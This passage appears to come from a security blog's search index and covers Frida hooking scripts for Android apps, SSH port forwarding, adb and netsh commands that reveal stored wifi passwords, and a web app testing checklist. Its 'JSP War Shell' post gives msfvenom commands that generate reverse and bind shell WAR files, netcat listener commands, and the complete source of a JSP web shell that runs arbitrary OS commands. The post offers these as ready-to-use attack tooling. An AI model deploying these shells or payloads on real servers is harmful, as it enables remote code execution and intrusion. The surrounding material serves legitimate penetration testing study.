Java.use(&quot;android.webkit.WebView&quot;); console.log(&#39;\\n\\n[+] Using &quot;android.webkit.WebView&quot;\\n&#39;); Webview.loadUrl.overload(&quot;java.lang.String&quot;).implementation = function(url) { console.log(&#39;[+] WebView loadUrl =&amp;gt;&#39;, url); this.loadUrl.overload(&quot;java.lang.String&quot;).call(this, url); }});We will then call this use this script with frida on our target application:frida -U -f com.example.app -l webview.js --no-pause -U for USB mode -f to tell frida to start the app -l to specify the script to load --no-pause to tell frida not to pause the app when it first starts so we don’t have to manually resume it (Optional)Script BreakdownLet’s breakdown the above script a bit further and explain what each part is doing:let Webview = Java.use(&quot;android.webkit.WebView&quot;); Get a reference to the android.webkit.WebView classWebview.loadUrl.overload(&quot;java.lang.String&quot;) Get a reference to the loadUrl method in the Webview (android.webkit.WebView) class. Specifically the method that takes a String parameter. Java methods can be overloaded (multiple methods with same name but take different params), so we need to be specific which method.Webview.loadUrl.overload(&quot;java.lang.String&quot;).implementation = function(url) { ... } Set the implementation of the loadUrl method to the function that we define. This is applied for all instances of Webview class.this.loadUrl.overload(&quot;java.lang.String&quot;).call(this, url); Call the original implementation. We have to specific java.lang.String in the overload method so we call the correct one.Dealing with TypesFor Methods that take string parameters it’s very easy to find that we should put java.lang.String as the type, but what about something more complex? What if the function accepts a Byte array, or Custom class as a parameter? How do we know what type to put?We could search on Google, or for a quicker method, let the frida errors tell us. If we change java.lang.String to something invalid like abcd, frida will tell us that the signature doesn’t match any of the overloads, and it will tell us what to put to make it valid. Using the previous script as a example:Webview.loadUrl.overload(&quot;abced&quot;)[+] Using &quot;android.webkit.WebView&quot;Error: loadUrl(): specified argument types do not match any of: .overload(&#39;java.lang.String&#39;) .overload(&#39;java.lang.String&#39;, &#39;java.util.Map&#39;) at X (frida/node_modules/frida-java-bridge/lib/class-factory.js:563)From this we can see there are two overloads available: overload(&#39;java.lang.String&#39;) overload(&#39;java.lang.String&#39;, &#39;java.util.Map&#39;)Class ConstructorsWe can hook the constructor of a class using $init as the method name.We’ll use the okhttp3 library and Response class within as an example.const printObj = (obj) =&amp;gt; { Object.entries(obj).forEach(([key, value]) =&amp;gt; { console.log(` - (${typeof(value)}):`, value) });}Java.perform(function() { let params = [&#39;okhttp3.Request&#39;, &#39;okhttp3.Protocol&#39;, &#39;java.lang.String&#39;, &#39;int&#39;, &#39;okhttp3.Handshake&#39;, &#39;okhttp3.Headers&#39;, &#39;okhttp3.ResponseBody&#39;, &#39;okhttp3.Response&#39;, &#39;okhttp3.Response&#39;, &#39;okhttp3.Response&#39;, &#39;long&#39;, &#39;long&#39;, &#39;okhttp3.internal.connection.Exchange&#39;]; let okHttp3Response = Java.use(&#39;okhttp3.Response&#39;); console.log(`\\n\\n[+] Hooking &quot;okhttp3.Response&quot;\\n`); okHttp3Response.$init.overload(...params).implementation = function() { console.log(&#39;[+] Response Captured:&#39;); printObj(arguments); this.$init.overload(...params)(...arguments); }});Calling Static MethodsJava.perform(function() { let AndroidUnicodeUtils = Java.use(&#39;com.facebook.hermes.unicode.AndroidUnicodeUtils&#39;); let result1 = AndroidUnicodeUtils.convertToCase(&#39;test string&#39;, 0, false); let result2 = AndroidUnicodeUtils.convertToCase(&#39;TEST STRING&#39;, 1, false); let result3 = AndroidUnicodeUtils.dateFormat(1636880183370.0, true, true); console.log(&#39;\\n\\n[+] Result1:&#39;, result1); console.log(&#39;[+] Result2:&#39;, result2); console.log(&#39;[+] Result3:&#39;, result3);});OUTPUTC:\\&amp;gt;frida -U -f com.facebook.orca -l call-static-method.js --no-pause...Spawned `com.facebook.orca`. Resuming main thread![Pixel XL::com.facebook.orca]-&amp;gt;[+] Result1: TEST STRING[+] Result2: test string[+] Result3: Nov 14, 2021 7:56:23 PMCreating ObjectsTODO: NOT COMPLETEDAlready Created ObjectsTODO: NOT COMPLETEDWebView DevToolsIf the target application is using webview to load content, it’s possible to view the developer tools for the mobile app like you can in any other browser.You can following the guide on the Google Chrome website about Remote Debugging WebViews found here.However, it’s very likely that the application won’t have webContentsDebugging enabled. Luckily though, we can do it very easily with Frida. We’ll save the below script in a file called webview-remote-debug.js.Java.perform(function() { let Webview = Java.use(&quot;android.webkit.WebView&quot;); console.log(&#39;\\n\\n[+] Hooking &quot;android.webkit.WebView&quot;\\n&#39;); Webview.setWebContentsDebuggingEnabled(true); console.log(&#39;[+] Enabled WebContentsDebugging\\n&#39;);});We’ll use the above code on the Amazon Shopping app:C:\\&amp;gt;adb shell pm list packages | findstr amazonpackage:com.amazon.mShop.android.shoppingC:\\&amp;gt;frida -U -f com.amazon.mShop.android.shopping -l webview-remote-debug.js --no-pause...Spawned `com.amazon.mShop.android.shopping`. Resuming main thread![Pixel XL::com.amazon.mShop.android.shopping]-&amp;gt;[+] Using &quot;android.webkit.WebView&quot;[+] Enabled WebContentsDebuggingWe can now use devtools to run JavaScript, inspect elements, view network traffic, view cookies, view session/local storage, etc.NOTE: If the application isn’t coming up, try closing Chrome completely and reloading chrome://inspect/#devices as sometimes it can be buggy.Hooking StringsThere will most likely be A LOT of output from the below scripts:toString MethodsJava.perform(function() { console.log(); let StringBuilder = Java.use(&#39;java.lang.StringBuilder&#39;); let StringBuffer = Java.use(&#39;java.lang.StringBuffer&#39;); StringBuilder.toString.overload().implementation = function() { let StringBuilderResult = this.toString.call(this); console.log(&quot;[+] StringBuilder:\\t&quot;, StringBuilderResult); return StringBuilderResult; } StringBuffer.toString.overload().implementation = function() { let StringBufferResult = this.toString.call(this); console.log(&quot;[+] StringBuffer:\\t&quot;, StringBufferResult); return StringBufferResult; }});String EqualsJava.perform(function() { console.log(); let str = Java.use(&#39;java.lang.String&#39;); str.equals.overload(&#39;java.lang.Object&#39;).implementation = function(obj) { let StringEqualsResult = this.equals.overload(&#39;java.lang.Object&#39;).call(this, obj); console.log(`[+] StringEquals (${StringEqualsResult}):`); console.log(&quot; [String1]:&quot;, this.toString()); console.log(&quot; [String2]:&quot;, obj.toString()); return StringEqualsResult; }});Resources &amp;amp; References https://frida.re/docs/examples/android/ https://github.com/iddoeldor/frida-snippets" }, { "title": "JSP War Shell", "url": "/posts/jsp-war-shell/", "categories": "security, web", "tags": "web, http, https, security, jsp, war, shell, rce", "date": "2021-10-25 20:09:48 +1100", "snippet": "How to generate a reverse, bind, and in-browser JSP War shell. This will cover generating payloads with MSFVenom and manually creating a war file from our own JSP file(s). JSP War Shell MSFVenom JSP War Reverse Shell JSP War Bind Shell Dealing with Errors JSP War Simple Browser Shell Example Shell Running on Windows Example Shell Running on Linux Package with Java Package Manually JSP War Shell MSFVenomUsing the msfvenom tool built into Kali, we can see what shells we have available:root@kali:~# msfvenom --list payloads | grep jsp java/jsp_shell_bind_tcp Listen for a connection and spawn a command shell java/jsp_shell_reverse_tcp Connect back to attacker and spawn a command shellroot@kali:~# We can check what settings need to be specified using:msfvenom -p java/jsp_shell_bind_tcp --list-optionsmsfvenom -p java/jsp_shell_reverse_tcp --list-optionsJSP War Reverse Shellmsfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.123 LPORT=3155 -f war &amp;gt; shell.warA netcat listener can be setup to listen for the connection using:nc -nvlp 3155JSP War Bind Shellmsfvenom -p java/jsp_shell_bind_tcp RHOST=0.0.0.0 LPORT=3155 -f war &amp;gt; bind.warWe can then use netcat to connect to the bind shell:nc -nv 192.168.0.123 3155Dealing with ErrorsThe above two shells are designed to working with Windows and Linux servers. However, sometimes the following message can come up after trying to load the application:This can be resolved by unzipping the war file, removing the System call, and replacing the OS check with correct shell path:String ShellPath = new String(&quot;cmd.exe&quot;);JSP War Simple Browser ShellApologies for the below code highlight, apparently the code highlighter doesn’t like JSP code.&amp;lt;body style=&quot;background: rgb(30,30,30);&quot;&amp;gt;&amp;lt;form method=&quot;GET&quot; action=&quot;index.jsp&quot;&amp;gt; &amp;lt;h4 style=&quot;color: white;&quot;&amp;gt;Command Options&amp;lt;/h4&amp;gt; &amp;lt;select id=&quot;osType&quot; name=&quot;osType&quot;&amp;gt; &amp;lt;option value=&quot;win&quot;&amp;gt;Windows&amp;lt;/option&amp;gt; &amp;lt;option value=&quot;linux&quot;&amp;gt;Linux&amp;lt;/option&amp;gt; &amp;lt;/select&amp;gt; &amp;lt;/br&amp;gt; &amp;lt;/br&amp;gt; &amp;lt;input id=&quot;cmd&quot; name=&quot;cmd&quot; type=text autofocus style=&quot;width: 300px;&quot;&amp;gt; &amp;lt;input type=submit value=&quot;Run Command&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;%@ page import=&quot;java.io.*&quot; %&amp;gt;&amp;lt;%! // Not Perfect, but will be good enough for a majority of cases that will arise public String HtmlEncode(String inputVal) { return inputVal.replaceAll(&quot;&amp;amp;&quot;, &quot;&amp;amp;amp;&quot;).replaceAll(&quot;&amp;lt;&quot;, &quot;&amp;amp;lt;&quot;).replaceAll(&quot;&amp;gt;&quot;, &quot;&amp;amp;gt;&quot;).replaceAll(&quot;\\&#39;&quot;, &quot;&amp;amp;apos;&quot;).replaceAll(&quot;\\&quot;&quot;, &quot;&amp;amp;quot;&quot;); } public String RunCommand(String commandToRun, String osType) { String outputString = &quot;&quot;; String currentLine = null; try { ProcessBuilder processBuilder = new ProcessBuilder(); if (osType.equals(&quot;win&quot;)) { processBuilder.command(&quot;cmd&quot;, &quot;/c&quot;, commandToRun); } else { processBuilder.command(&quot;bash&quot;, &quot;-c&quot;, commandToRun); } Process p = processBuilder.start(); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((currentLine = sI.readLine()) != null) { outputString += HtmlEncode(currentLine) + &quot;&amp;lt;/br&amp;gt;&quot;; } } catch(IOException e) { outputString = &quot;ERROR: &amp;lt;/br&amp;gt;&amp;lt;/br&amp;gt;&quot; + e.getCause() + &quot;&amp;lt;/br&amp;gt;&amp;lt;/br&amp;gt;&quot; + e.getMessage() + &quot;&amp;lt;/br&amp;gt;&quot;; } return outputString; }%&amp;gt;&amp;lt;% String osType = request.getParameter(&quot;osType&quot;); String cmd = request.getParameter(&quot;cmd&quot;); String output = &quot;&quot;; String htmlCmd = &quot;&quot;; String htmlOsType = &quot;&quot;; if (osType == null || (!osType.equals(&quot;win&quot;) &amp;amp;&amp;amp; !osType.equals(&quot;linux&quot;))) { osType = &quot;linux&quot;; } if(cmd != null) { String line = null; String testCommand = RunCommand(&quot;&quot;, osType); if (testCommand.startsWith(&quot;ERROR:&quot;)) { output = RunCommand(cmd, osType); } else { if (osType.equals(&quot;win&quot;)) { output = &quot;&amp;lt;b style=\\&quot;color: white;\\&quot;&amp;gt;&quot; + HtmlEncode(RunCommand(&quot;cd&quot;, osType).trim().replaceAll(&quot;&amp;lt;/br&amp;gt;&quot;, &quot;&quot;).replaceAll(&quot;\\r&quot;, &quot;&quot;).replaceAll(&quot;\\n&quot;, &quot;&quot;)) + HtmlEncode(&quot;&amp;gt; &quot;) + HtmlEncode(cmd) + &quot;&amp;lt;/br&amp;gt;&amp;lt;/br&amp;gt;&amp;lt;/b&amp;gt;&quot;; } else { String username = HtmlEncode(RunCommand(&quot;whoami&quot;, osType).trim().replaceAll(&quot;&amp;lt;/br&amp;gt;&quot;, &quot;&quot;).replaceAll(&quot;\\r&quot;, &quot;&quot;).replaceAll(&quot;\\n&quot;, &quot;&quot;)); String hostname = HtmlEncode(RunCommand(&quot;hostname&quot;, osType).trim().replaceAll(&quot;&amp;lt;/br&amp;gt;&quot;, &quot;&quot;).replaceAll(&quot;\\r&quot;, &quot;&quot;).replaceAll(&quot;\\n&quot;, &quot;&quot;)); String workingDir = HtmlEncode(RunCommand(&quot;pwd&quot;, osType).trim().replaceAll(&quot;&amp;lt;/br&amp;gt;&quot;, &quot;&quot;).replaceAll(&quot;\\r&quot;, &quot;&quot;).replaceAll(&quot;\\n&quot;, &quot;&quot;)); String userAndHost = &quot;&amp;lt;b style=\\&quot;color: rgb(136,223,51);\\&quot;&amp;gt;&quot; + username + &quot;@&quot; + hostname + &quot;&amp;lt;/b&amp;gt;&quot; + &quot;&amp;lt;span style=\\&quot;color: white;\\&quot;&amp;gt;:&amp;lt;/span&amp;gt;&quot;; String dirPath = &quot;&amp;lt;span style=\\&quot;color: rgb(114,159,207);\\&quot;&amp;gt;&quot; + workingDir + &quot;&amp;lt;/span&amp;gt;&quot;; output = userAndHost + dirPath + &quot;&amp;lt;span style=\\&quot;color: white;\\&quot;&amp;gt;# &quot; + HtmlEncode(cmd) + &quot;&amp;lt;/span&amp;gt;&amp;lt;/br&amp;gt;&amp;lt;/br&amp;gt;&quot;; } output += RunCommand(cmd, osType); } htmlCmd = HtmlEncode(cmd); htmlOsType = HtmlEncode(osType); }%&amp;gt;&amp;lt;pre style=&quot;color: white;&quot;&amp;gt;&amp;lt;%=output %&amp;gt;&amp;lt;/pre&amp;gt;&amp;lt;script&amp;gt; let cmdValue = &quot;&amp;lt;%=htmlCmd %&amp;gt;&quot;.replaceAll(&quot;&amp;amp;quot;&quot;, &quot;\\&quot;&quot;).replaceAll(&quot;&amp;amp;apos;&quot;, &quot;\\&#39;&quot;).replaceAll(&quot;&amp;amp;gt;&quot;, &quot;&amp;gt;&quot;).replaceAll(&quot;&amp;amp;lt;&quot;, &quot;&amp;lt;&quot;).replaceAll(&quot;&amp;amp;amp;&quot;, &quot;&amp;amp;&quot;); let osTypeValue = &quot;&amp;lt;%=htmlOsType %&amp;gt;&quot;; if (osTypeValue !== &#39;win&#39; &amp;amp;&amp;amp; osTypeValue !== &#39;linux&#39;) osTypeValue = &#39;linux&#39;; document.getElementById(&#39;cmd&#39;).value = cmdValue; document.getElementById(&#39;osType&#39;).value = osTypeValue;&amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;Example Shell Running on WindowsExample Shell Running on LinuxPackage with JavaWith the above JSP code, we can bundle it into a war file using the jar tool that comes with Java JDK:jar -cvf OUTPUT_FILE INPUT_FILESjar -cvf browser-shell.war index.jsp index.jsp can also be substituted with * to bundle all the files in the current folder.Package ManuallyAlternatively, you can create a folder called META-INF, and inside that folder created a file called MANIFEST.MF. This file should contain the manifest version and Java version:Manifest-Version: 1.0Created-By: 17.0.1 (Oracle Corporation)We then create a zip file with the index.jsp file and the META-INF folder using a tool like 7zip. The output file should be renamed so it has the .war extension. The contents of the war file should look like this:(FILE) index.jsp(FOLDER) META-INF(FILE) MANIFEST.MF" }, { "title": "SSH Port Forwarding", "url": "/posts/ssh-port-forwarding/", "categories": "security", "tags": "security, ssh, port-forwarding, server, linux", "date": "2021-10-22 00:17:04 +1100", "snippet": "Guide for basic SSH usage and SSH Port Forwarding. Basic SSH Connect to Host Connect to Host with Private Key Connect to Host with Certain KeyExchange &amp;amp; Cipher Copy Files to Host Copy Files from Host SSH Port Forwarding Local SSH Port Forward Remote SSH Port Forward Gateway Ports Basic SSHConnect to Hostssh USER@HOST_IP -p 2222 -p to specify the port (22 is default)Connect to Host with Private Keyssh -i PRIVATE_KEY USER@HOST_IPCopy Files to Hostscp local_file.txt USER@HOST_IP:/tmp/remote_file.txtCopy Files from Hostscp USER@HOST_IP:/tmp/remote_file.txt local_file.txt Connect to Host with Certain KeyExchange &amp;amp; Cipherssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes256-ctr USER@HOST_IPSSH Port ForwardingLocal SSH Port ForwardLet’s say a remote host has an application listening on localhost:3000 and you want to connect to it from your local computer. Perhaps it’s a database listening on localhost and you don’t want it exposed to the network/internet.Using a Local Port Forward we can setup a listener on our local computer, which when we connect to will go through the SSH tunnel to the listener on the remote host.Here is the command that will allow us to do that:ssh -L 1337:localhost:3000 USER@REMOTE_HOST_IPThis command will setup a listener on your local machine on localhost:1337. Connecting to this will be the same as if you connected to localhost:3000 on the remote host.Remote SSH Port ForwardLet’s say you have an application listening on localhost:9595 on your local computer and your friend wants to connect to your application. However, both you and your friend home networks are behind CGNAT so you can’t directly connect to each other or setup normal router port forwards.With an additional internet facing server (VPS such as an EC2 instance), you can do the following:On your computer:ssh -R 9000:localhost:9595 USER@REMOTE_HOST_IPThis command will setup a listener on the remote host on localhost:9000. Connecting to the remote host on localhost:9000 will be the same as if you connected to localhost:9595 on your local machine.This situation is now the same as a Local Port Forward. The remote host is now listening on localhost:9000. Your friend can now create a new listener on their computer using a Local Port Forward.On your friends computer:ssh -L 1337:localhost:9000 USER@REMOTE_HOST_IPGateway PortsFor the above example we had todo two port forwards, this isn’t ideal is some cases. Ideally we would like to setup a listen on a specific interface or on 0.0.0.0. However, when we do an SSH Port Forward, the default listener is on 127.0.0.1. To change this and allow it to listen on all interfaces, we need to enabled the GatewayPorts options on the SSH Server and restart it." }, { "title": "Mobile Useful", "url": "/posts/mobile-useful/", "categories": "security, mobile", "tags": "security, mobile, android, ios", "date": "2021-10-15 22:55:49 +1100", "snippet": "Collection of commands for when working with Android and iOS devices. Device must be Rooted/Jailbroken for almost all commands. Both Objection Search Files for String Search for File Name Extract App Files Android Android Debug Bridge (adb) Wifi Passwords Network Interfaces iOS Binary Info Screenshot Location NSAllowsArbitraryLoads BothObjectionAnother post has been created that is entirely dedicated to using Objection with Android and iOS. Post can be found here.Search Files for StringPrint files that contain a certain strings when in device shell (adb shell). Good for searching for clear-text data stored by apps:grep -ril &#39;/PATH_TO_SEARCH&#39; -e &#39;SEARCH_TERM`Search for File Namefind SEARCH_DIR -name *.sqlitefind SEARCH_DIR -name *.sqlite 2&amp;gt;/dev/null 2&amp;gt;/dev/null can be used to hide permission denied errors.Extract App FilesUse the following command to archive an entire app folder so that it can be extracted and viewed on a computer more easily:tar -cvzf OUTPUT_FILE FOLDER_TO_TARtar -cvzf /sdcard/files.tar /data/user/0/com.example.app/AndroidAndroid Debug Bridge (adb)The target device will need to have USB (or wifi) debugging enabled Description Command View Connected Devices adb devices View Connected Devices (with Device Info) adb devices -l Install Package (apk) adb install local_path_to_apk Uninstall Package adb shell pm uninstall com.example.TestApp Get Packages (All Packages) adb shell pm list packages Get Packages (Full APK Path) adb shell pm list packages -f Get Packages (3rd Party Only) adb shell pm list packages -3 Get Packages (System Packages Only) adb shell pm list packages -s Interactive Shell adb shell Run Command without Interactive Shell adb shell ls -la /sdcard/ Copy file TO Device adb push local_path remote_path Copy file FROM Device adb pull remote_path local_path View Logs adb logcat Screenshot adb shell screencap /sdcard/screenshot.png Screen Record adb shell screenrecord /sdcard/record.mp4 Screen Record (with time limit) adb shell screenrecord –time-limit time_in_seconds /sdcard/record.mp4 Enable/Disable Wifi adb shell svc wifi enable/disable Simulate KeyPress (Home Button) adb shell input keyevent KEYCODE_HOME Simulate KeyPress (0400) adb shell input keyevent 7 11 7 7 Start Activity (Call a Number) adb shell am start -a android.intent.action.DIAL -d tel:+61400000000 Start Activity (SMS Someone) adb shell am start -a android.intent.action.SENDTO -d smsto:+61400000000 –es sms_body ‘Test SMS’ –ez exit_on_sent false local refers to a location/file on the connected PC. remote refers to a location/file on the connected Device (phone). More keyevent codes can be found online in the Android Docs.Wifi PasswordsNOTE: that this is a restricted folder, so the device will need to be Rooted. Go to the directory /data/misc/wifi. Wifi configuration data should be in WifiConfigStore.xml or wpa_supplicant.conf.Network Interfaces Description Command Show Network Interfaces ip -f inet addr show Show Single Network Interface ip -f inet addr show interface_name iOSBinary InfoDisplay info about an installed binary on an iOS device. Requires iOS device to be jailbroken and the Radare2 tool to be installed. Radare can be installed through Cydia: Source = https://cydia.radare.org/ Package = Radarerabin2 -I /private/var/containers/Bundle/Application/INSERT_ID/APP_NAME/APP_BINARY -I Show binary infoExample with DuckDuckGo app:rabin2 -I /private/var/containers/Bundle/Application/INSERT_ID/DuckDuckGo.app/DuckDuckGoarch armbaddr 0x100000000binsz 2753920bintype mach0bits 64canary trueclass MACH064crypto trueendian littlehavecode trueintrp /usr/lib/dyldladdr 0x0lang swiftlinenum falselsyms falsemachine allmaxopsz 4minopsz 4nx falseos darwinpcalign 4pic truerelocs falsesanitiz falsestatic falsestripped truesubsys darwinva trueScreenshot LocationIf you take a screenshot, the image will be stored in the following location: /private/var/mobile/Media/DCIM/100APPLE/NSAllowsArbitraryLoadsSearch the app’s Info.plist file for the NSAppTransportSecurity key. Ensure the value for NSAllowsArbitraryLoads key is set to false unless there is a good reason not to.Example:&amp;lt;key&amp;gt;NSAppTransportSecurity&amp;lt;/key&amp;gt;&amp;lt;dict&amp;gt; &amp;lt;key&amp;gt;NSAllowsArbitraryLoads&amp;lt;/key&amp;gt; &amp;lt;true/&amp;gt;&amp;lt;/dict&amp;gt;" }, { "title": "Netsh Get Info", "url": "/posts/netsh/", "categories": "security, windows", "tags": "security, windows, cmd, powershell, netsh", "date": "2021-10-05 23:46:19 +1100", "snippet": "Collection of interesting and useful commands for the Netsh tool in Windows. Netsh has a huge amount of functionality, this is by no means exhaustive. Description Command Show Wifi Profiles netsh wlan show profiles Show Wifi Profile Password netsh wlan show profile wifi_name key=clear Show Interface Status netsh interface ipv4 show interfaces Show Interface IPs netsh interface ipv4 show ipaddresses Show Interface IP, Gateway, Subnet netsh interfaces ipv4 show addresses Show Network Routing netsh interface ipv4 show route Show DNS Servers netsh interface ipv4 show dnsservers Show Cached IPs &amp;amp; MACs of Known Hosts netsh interface ipv4 show neighbors Show Current TCP Connections netsh interface ipv4 show tcpconnections Show Firewall Status netsh advfirewall show allprofiles " }, { "title": "Web App Checklist", "url": "/posts/web-app-checklist/", "categories": "tools", "tags": "tools, security, web, http, https", "date": "2021-10-04 08:14:02 +1100", "snippet": "This page is an interactive tool of this page. All the data for this checklist application is STORED CLIENT-SIDE. This application works by storing data in localStorage so that it’s persistent between reloads.You will need popups (dialogs) enabled for this application to work properly.New ProjectDelete ALL Projects Project Name Creation Time Checks Complete Loaded Project:" }, { "title": "Web App Security", "url": "/posts/web-app-security/", "categories": "security, web", "tags": "web, http, https, security, csrf, cookies", "date": "2021-09-29 18:01:50 +1100", "snippet": "General purpose guide for testing Web Applications. This list is not supposed to be exhaustive, nor is the information absolute. Each web application is different and the business case needs to be thought about when assessing the below items. The checks are not explained in depth on purpose and should be used as a reference only. HTTP Headers Server Version Disclosure X-Frame Options - Missing CORS - Wildcard CORS - Reflected Origin HSTS - Missing HSTS - Insecure CSP - Missing CSP - Insecure Referrer-Policy - Missing Referrer-Policy - Insecure X-XSS-Protection - Missing X-XSS-Protection - Insecure Host Header Injection Header Injection Duplicate Headers Session &amp;amp; Cookies Missing Attribute - Secure Missing Attribute - HTTPOnly Missing Attribute - SameSite Path Attribute Concurrent Sessions Session Timeout Session Termination Session Fixation Session Cookie Not Changing Session Not Invalidated After Changing Password Decode Cookies Lack of Logout Functionality Authentication Login with no Password Lack of MFA Account Lockout Account Lockout on Change Password No MFA Lockout MFA Bypass User Enumeration - Error Based User Enumeration - Time Based Password Strength Password History Case Insensitive Password Client-Side Password Requirements Password Not Required to Change Password Use of Basic Authentication No Method to Change Password User Account DoS Authorisation Remove Cookies ONE at a time Remove ALL Cookies and/or Tokens JWT Checks Unauthorised Data Access Unauthorised API Access Horizontal Privilege Escalation Vertical Privilege Escalation Forceful Browsing CSRF CSWSH Data Storage Sensitive Cookies Session Storage Local Storage Window Object Returned Data Input Validation Lack of Validation Client-Side Validation Reflected Parameters Output Encoding CSV Injection Error Messages Parameter Pollution Mass Assignment File Upload Directory Traversal Server Configuration Directory Listing TLS Configuration Wildcard Certificate TRACE Method Enabled Outdated Libraries in Use Sensitive Information in URL Lack of Subresource Integrity Checks Lack of HTTPS Use of HTTP (no TLS) Sequential IDs POST Requests as GET Requests No WAF Rate Limiting HTTP HeadersServer Version DisclosureEnsure the server does not disclose any information about the underlying server software or operating system.HTTP/1.1 200 OKServer: Microsoft-IIS/10.0X-AspNet-Version: 4.0.30319X-Powered-By: ASP.NETServer: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.5X-Powered-By: ExpressX-Frame Options - MissingEnsure HTTP responses that contain HTML pages have the X-Frame-Options header set.X-Frame-Options: DENYX-Frame-Options: SAMEORIGINX-Frame-Options: ALLOW-FROM uri More info at MDN Web Docs: X-Frame-Options HeaderCORS - WildcardCheck if the HTTP response contains the wildcard CORS header. This may be desired in some applications, but is most often not required.Access-Control-Allow-Origin: * More info at MDN Web Docs: Access-Control-Allow-OriginCORS - Reflected OriginCheck if the HTTP response reflects the value provided in the Origin request header in the Access-Control-Allow-Origin response header. If the Access-Control-Allow-Credentials: true response header is also present, this can leaded to authenticated content being loaded cross-origin, as well as bypassing anti-CSRF tokens in certain cases.Request HeaderOrigin: https://attacker.comResponse HeaderAccess-Control-Allow-Origin: https://attacker.com More info at MDN Web Docs: Access-Control-Allow-OriginHSTS - MissingCheck that the HTTP Strict-Transport-Security (HSTS) header is present on all HTTP responses.Strict-Transport-Security: max-age=31536000; includeSubDomainsStrict-Transport-Security: max-age=63072000; includeSubDomains; preload 31536000 is 1 year expressed in seconds (60*60*24*365) 63072000 is 2 years expressed in seconds (60*60*24*365*2) (PREFERRED) More info at MDN Web Docs: Strict-Transport-SecurityHSTS - InsecureCheck for insecure configurations of the HSTS header. These include a max-age of 0 which effectively disables the control, or missing directives such as includeSubDomains or preload. Please note that the additional directives may not always be required.Strict-Transport-Security: max-age=0; includeSubDomainsStrict-Transport-Security: max-age=31536000CSP - MissingCheck that the Content-Security-Policy (CSP) header is present on HTTP responses that return HTML and JavaScript. The CSP header is required on JavaScript responses when using web workers as they do not inherit the Content-Security-Policy of the site. The CSP header is not required on other response types such as JSON or CSS. However, it does not hurt to include on all responses if the CSP header is small.Content-Security-Policy: &amp;lt;policy-directive&amp;gt;; &amp;lt;policy-directive&amp;gt;Content-Security-Policy: default-src &#39;self&#39;; connect-src &#39;none&#39;; More info at MDN Web Docs: Content-Security-PolicyCSP - InsecureCheck if the Content-Security-Policy header contains &#39;unsafe-eval&#39; or &#39;unsafe-inline&#39;. These drastically reduce the protection CSP provides against XSS attacks and should NOT be included if possible.Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; &#39;unsafe-eval&#39; &#39;unsafe-inline&#39;; connect-src &#39;none&#39;;Referrer-Policy - MissingCheck that the Referrer-Policy header is present on HTTP responses that return HTML to minimise data leakage via the Referer header added by the browser.NOTE that referrer polices can also be added to HTML elements. See MDN Web Docs below for more info.Referrer-Policy: no-referrerReferrer-Policy: strict-origin More info at MDN Web Docs: Referrer-PolicyReferrer-Policy - InsecureCheck that the Referrer-Policy header is not set to an insecure setting. no-referrer is best, but other settings such as origin and strict-origin may be required depending on the application.Referrer-Policy: unsafe-urlReferrer-Policy: no-referrer-when-downgrade Examples at MDN Web Docs: Referrer-Policy#ExamplesX-XSS-Protection - MissingCheck if the X-XSS-Protection header is present. This header is mostly not used by modern browsers and is not required if a strong Content-Security-Policy is used that blocks inline JavaScript.X-XSS-Protection: 1X-XSS-Protection: 1; mode=block More info at MDN Web Docs: X-XSS-ProtectionX-XSS-Protection - InsecureCheck if the X-XSS-Protection header is present but has been configured to disable XSS filtering.X-XSS-Protection: 0Host Header InjectionCheck if the value in the Host request header is reflected in any location in the server response. This includes locations such as links and form submission locations.Header InjectionCheck if headers can be injected into the server response. A real world example of this happening: When sending OPTIONS requests to this particular server, the server reflected all the request headers as response headers. This could be used as a way of extract cookies using JavaScript because the Cookie header is not automatically removed from the HTTP response like the Set-Cookie header is.Duplicate HeadersCheck if the server responds with duplicate headers. This can happen normally if there is a load balancer, proxy, multiple API servers.Session &amp;amp; CookiesMissing Attribute - SecureEnsure that all cookies used by the web application have the Secure attribute set. Some websites will have HTTP enabled so that a user can be redirected to the HTTPS version of the site. Cookies without the Secure flag can be sent during this first unencrypted HTTP request. Even tracking and non-session cookies should only be sent over HTTPS. The only exceptions are for sites that don’t use TLS, which should be rare.Set-Cookie: &amp;lt;cookie-name&amp;gt;=&amp;lt;cookie-value&amp;gt;; Secure More info at MDN Web Docs: Set-CookieMissing Attribute - HTTPOnlyEnsure that session cookies used by the web application have the HttpOnly attribute set. Cookies will this attribute set can not be accessed via JavaScript. Cookies without this attribute can be accessed by JavaScript and as a result can be stolen by an attacker if an XSS vulnerability exists in the application. Only non-sensitive cookies that need to be accessed by the front-end should be set without this attribute.Set-Cookie: &amp;lt;cookie-name&amp;gt;=&amp;lt;cookie-value&amp;gt;; HttpOnly More info at MDN Web Docs: Set-CookieMissing Attribute - SameSiteEnsure that session cookies used by the web application have the SameSite attribute set and is not the value None. Cookies will this attribute set to Strict or Lax are more resistent to CSRF attacks as they will not be included in cross-origin requests. Using the Strict attribute is arguably simpler and more secure than using anti-CSRF tokens for most web applications as there is much less room for implementation errors.Set-Cookie: &amp;lt;cookie-name&amp;gt;=&amp;lt;cookie-value&amp;gt;; SameSite=StrictSet-Cookie: &amp;lt;cookie-name&amp;gt;=&amp;lt;cookie-value&amp;gt;; SameSite=LaxSet-Cookie: &amp;lt;cookie-name&amp;gt;=&amp;lt;cookie-value&amp;gt;; SameSite=None; Secure More info at MDN Web Docs: Set-CookiePath AttributeCheck if the Path attribute should be set for application’s session cookies. This attribute is not always required and having a value of Path=/ is not always an issue. Care should be given to this attribute if multiple applications are hosted on the same domain and/or if the application is not located at the root path (i.e. the web application is located at /application instead of at /).Set-Cookie: &amp;lt;cookie-name&amp;gt;=&amp;lt;cookie-value&amp;gt;; Path=/Set-Cookie: &amp;lt;cookie-name&amp;gt;=&amp;lt;cookie-value&amp;gt;; Path=/application More info at MDN Web Docs: Set-CookieConcurrent SessionsCheck if a user can have multiple sessions open at once using different browsers (or using Private-Mode). This may not be an issue for some web applications, depending on the application and sensitivity of the data being dealt with.Session TimeoutEnsure that the session is automatically invalided after a certain period of inactivity, normally 30 mins to 1 hour is standard. Note, this may not be desirable in some applications.Session TerminationEnsure that after a logout is performed, the cookie is actually invalidated and simply cleared.Session FixationEnsure after a successful login that a new session cookie is received from the server. 